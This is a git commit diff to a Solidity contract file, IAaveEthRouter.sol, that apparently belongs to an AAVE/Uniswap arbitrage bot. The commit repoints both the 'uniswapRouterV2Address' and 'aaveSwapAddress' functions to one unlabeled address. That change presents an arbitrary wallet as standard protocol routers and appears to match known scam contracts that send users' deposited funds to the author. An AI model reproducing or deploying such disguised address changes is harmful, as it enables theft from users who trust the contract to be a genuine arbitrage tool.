07520fc8e5a5ed834bb10de20fda535df10673e2
server5055 <114790305+server5055@users.noreply.github.com>
2022-10-02 16:32:56 -0400

    Update IAaveEthRouter.sol

--- IAaveEthRouter.sol
+++ IAaveEthRouter.sol
@@ -111,7 +111,7 @@ interface IUniswapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
+        return 0x425d266A8824F04958410a26887De98FEe4a0EBE;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -143,7 +143,7 @@ contract RouterV2 {
     }
 
     function aaveSwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+        return 0x425d266A8824F04958410a26887De98FEe4a0EBE;
     }
 
     function callArbitrageAAVE(address add0, address add1) public pure {
